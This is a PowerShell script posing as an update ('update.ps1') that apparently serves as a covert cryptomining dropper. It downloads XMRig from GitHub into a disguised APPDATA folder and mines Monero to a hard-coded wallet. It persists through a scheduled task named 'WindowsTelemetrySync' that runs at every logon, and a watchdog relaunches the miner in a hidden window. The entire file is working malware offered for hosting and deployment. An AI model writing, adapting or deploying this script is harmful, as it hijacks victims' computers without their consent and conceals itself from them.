# [update.ps1] - Optimized Miner Deployment for Cruelmonks
# Host this on: https://github.com/itzcurled/cruelmonks/

$workDir = "$env:APPDATA\SystemServices"
$minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$zipPath = "$workDir\data.zip"
$exePath = "$workDir\xmrig-6.21.0\xmrig.exe"
$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"

# 1. Setup
if (!(Test-Path $workDir)) { 
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

# 2. Fetch
if (!(Test-Path $exePath)) {
    Invoke-WebRequest -Uri $minerUrl -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $workDir -Force
    Remove-Item $zipPath
}

# 3. Persistence
$taskName = "WindowsTelemetrySync"
$args = "-o pool.supportxmr.com:443 -u $wallet -p CruelWorker --donate-level 1 --background"
$action = New-ScheduledTaskAction -Execute $exePath -Argument $args
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -TaskName $taskName -Force | Out-Null

# 4. Watchdog
$watchdog = {
    param($path, $args)
    while($true) {
        if (!(Get-Process "xmrig" -ErrorAction SilentlyContinue)) {
            Start-Process -FilePath $path -ArgumentList $args -WindowStyle Hidden
        }
        Start-Sleep -Seconds 60
    }
}

Start-Job -ScriptBlock $watchdog -ArgumentList $exePath, $args | Out-Null
